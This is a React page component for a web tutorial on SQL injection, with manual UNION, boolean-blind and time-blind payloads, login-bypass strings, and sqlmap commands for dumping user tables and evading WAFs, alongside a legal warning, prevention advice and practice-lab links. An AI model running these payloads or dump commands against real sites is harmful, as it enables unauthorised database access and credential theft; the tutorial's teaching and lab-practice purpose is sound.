import GuideLayout from '@/components/GuideLayout';
export default function SQLiTutorialPage() {
  return (
    <GuideLayout
      title="SQL Injection from A to Z – Manual & sqlmap Guide"
      description="Complete SQL injection tutorial covering manual UNION-based, blind, and time-based SQLi plus automated sqlmap. Includes 50+ payloads and WAF bypass techniques."
      timeToRead="60 min read" lastUpdated="September 2026"
      tags={['SQL Injection','sqlmap','Web Security','Intermediate']}
      tools={[{name:'WAF Detector',url:'/tools/waf-detector'},{name:'DNS Lookup',url:'/tools/dns-lookup'}]}
      relatedGuides={[{title:'Kali Linux Pentesting',url:'/guides/kali-linux-pentesting-tutorial'},{title:'CTF Walkthrough',url:'/guides/ctf-walkthrough-beginner'}]}
      headings={[{id:'intro',label:'What is SQLi?'},{id:'manual',label:'Manual SQLi (10 Steps)'},{id:'sqlmap',label:'sqlmap (Automated)'},{id:'post',label:'POST Form Injection'},{id:'waf-bypass',label:'WAF Bypass'},{id:'prevention',label:'Prevention'},{id:'practice',label:'Practice Labs'}]}
    >
      <div className="callout-warn"><strong>⚠️ Legal Warning:</strong> SQL injection testing is illegal on systems you don&apos;t own. Only test on authorised systems or practice labs like DVWA and PortSwigger Academy.</div>

      <h2 id="intro">What is SQL Injection?</h2>
      <p>SQL injection (SQLi) occurs when user-supplied input is inserted directly into a SQL query without proper sanitisation. Attackers can read, modify, or delete database data — and in some cases execute OS commands.</p>

      <h2 id="manual">Manual SQL Injection – 10 Steps</h2>
      <h3>Step 1: Identify the Injection Point</h3>
      <pre><code>{`URL: http://target.com/products?id=1

# Try adding a single quote:
http://target.com/products?id=1'
# If you see a SQL error = injectable!`}</code></pre>

      <h3>Step 2: Determine Number of Columns</h3>
      <pre><code>{`http://target.com/products?id=1' ORDER BY 1--
http://target.com/products?id=1' ORDER BY 2--
http://target.com/products?id=1' ORDER BY 3--
http://target.com/products?id=1' ORDER BY 4--  # Error = 3 columns`}</code></pre>

      <h3>Step 3: Find Display Positions</h3>
      <pre><code>{`http://target.com/products?id=-1' UNION SELECT 1,2,3--
# Numbers visible on page = those column positions are displayed`}</code></pre>

      <h3>Step 4: Extract Database Info</h3>
      <pre><code>{`http://target.com/products?id=-1' UNION SELECT 1,database(),user()--
http://target.com/products?id=-1' UNION SELECT 1,version(),@@datadir--`}</code></pre>

      <h3>Step 5: List Tables</h3>
      <pre><code>{`http://target.com/products?id=-1' UNION SELECT 1,table_name,3 
FROM information_schema.tables 
WHERE table_schema=database()--`}</code></pre>

      <h3>Step 6: List Columns</h3>
      <pre><code>{`http://target.com/products?id=-1' UNION SELECT 1,column_name,3 
FROM information_schema.columns 
WHERE table_name='users'--`}</code></pre>

      <h3>Step 7: Dump Data</h3>
      <pre><code>{`http://target.com/products?id=-1' UNION SELECT 1,username,password FROM users--`}</code></pre>

      <h3>Step 8: Login Bypass</h3>
      <pre><code>{`# Username field:  admin'--
# Username field:  admin' OR '1'='1
# Username field:  ' OR 1=1--
# Password field:  anything (ignored by --)

# Classic:
' OR '1'='1
' OR 1=1--
admin'/**/OR/**/1=1--`}</code></pre>

      <h3>Step 9: Boolean-Based Blind SQLi</h3>
      <pre><code>{`# True condition = page loads normally
http://target.com/products?id=1' AND 1=1--

# False condition = page empty/different
http://target.com/products?id=1' AND 1=2--

# Extract data char by char:
http://target.com/products?id=1' AND SUBSTRING(database(),1,1)='s'--`}</code></pre>

      <h3>Step 10: Time-Based Blind SQLi</h3>
      <pre><code>{`# If page delays 5 seconds = true condition
http://target.com/products?id=1' AND SLEEP(5)--
http://target.com/products?id=1'; WAITFOR DELAY '0:0:5'--  # MSSQL`}</code></pre>

      <h2 id="sqlmap">sqlmap – Automated SQL Injection</h2>
      <p>GitHub: <a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener noreferrer">github.com/sqlmapproject/sqlmap</a></p>
      <pre><code>{`# Install
sudo apt install sqlmap   # Kali
git clone https://github.com/sqlmapproject/sqlmap.git

# Basic scan
sqlmap -u "http://target.com/products?id=1" --batch

# List databases
sqlmap -u "http://target.com/products?id=1" --batch --dbs

# List tables in a database
sqlmap -u "http://target.com/products?id=1" --batch -D mydb --tables

# Dump table data
sqlmap -u "http://target.com/products?id=1" --batch -D mydb -T users --dump

# Dump specific columns only
sqlmap -u "http://target.com/products?id=1" --batch -D mydb -T users -C username,password --dump

# POST injection (login form)
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# Use a proxy (Burp Suite)
sqlmap -u "http://target.com/products?id=1" --batch --proxy="http://127.0.0.1:8080"`}</code></pre>

      <h2 id="waf-bypass">WAF Bypass Tamper Scripts</h2>
      <pre><code>{`# Common tamper scripts
sqlmap -u "http://target.com/products?id=1" --batch \\
  --tamper=space2comment,between,randomcase

# Space to comment (/**/): space2comment
# Random case (SeLeCt): randomcase
# URL encoding: charencode
# Double URL encoding: chardoubleencode
# HTML encoding: htmlencode`}</code></pre>

      <h2 id="prevention">Prevention</h2>
      <ul>
        <li>Use <strong>parameterised queries / prepared statements</strong> (the only real fix)</li>
        <li>Use an ORM (Hibernate, SQLAlchemy, TypeORM)</li>
        <li>Validate and sanitise all user input</li>
        <li>Use a WAF — check yours: <a href="/tools/waf-detector">WAF Detector →</a></li>
        <li>Apply principle of least privilege to DB accounts</li>
      </ul>

      <h2 id="practice">Practice Labs</h2>
      <ul>
        <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener noreferrer">PortSwigger Web Security Academy</a> — Free, best SQLi labs</li>
        <li><a href="https://github.com/digininja/DVWA" target="_blank" rel="noopener noreferrer">DVWA</a> — Damn Vulnerable Web App</li>
        <li><a href="https://github.com/Akhilsharma/SQLi-Labs" target="_blank" rel="noopener noreferrer">SQLi-Labs (GitHub)</a> — 100+ SQLi challenges</li>
      </ul>
    </GuideLayout>
  );
}
